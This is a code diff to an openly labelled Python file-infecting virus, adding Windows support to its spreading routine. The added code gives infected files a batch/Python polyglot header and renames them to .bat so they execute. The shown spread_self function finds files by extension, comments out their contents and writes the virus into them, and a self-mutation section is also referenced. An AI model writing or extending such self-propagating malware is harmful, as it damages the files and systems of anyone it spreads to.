@@ -49,7 +49,7 @@ def retrieve_code():
             virus.append("\n")
             break
 
-    virus[0] = "#!/usr/bin/env python" if target_os == "Windows" else "#!/usr/bin/env python3\n"
+    virus[0] = "@echo off & python -x \"%~f0\" %* & goto :eof\n" if target_os == "Windows" else "#!/usr/bin/env python3\n"
 
     return virus
 
@@ -57,6 +57,16 @@ def spread_self(targeted_file_type, virus):
 
     # Go through files with target file extension.
     for item in glob.glob(str(f"*{targeted_file_type}")):
+
+        # If the OS is windows, file needs to be renamed to batch file
+        # so check if batch file with same name already exists.
+        new_file_name = item    # Variable only needed for windows instances
+        if target_os == "Windows": 
+            basename, _ = os.path.splitext(item)
+            new_file_name = basename + '.bat'
+
+            if os.path.exists(new_file_name):
+                continue
 
         # Read in the target file
         virus_file = open(item, 'r')
@@ -80,6 +90,12 @@ def spread_self(targeted_file_type, virus):
         all_lines = ['#' + line for line in all_lines]
         target_file.writelines(all_lines)
         target_file.close()
+
+        # Reconfigure to a .bat (batch) script
+        if target_os == "Windows":
+            os.rename(item, new_file_name)
+            print(f"Renamed file to {new_file_name}")
+
 
 # -- Self Mutation Functions -- 
 #region
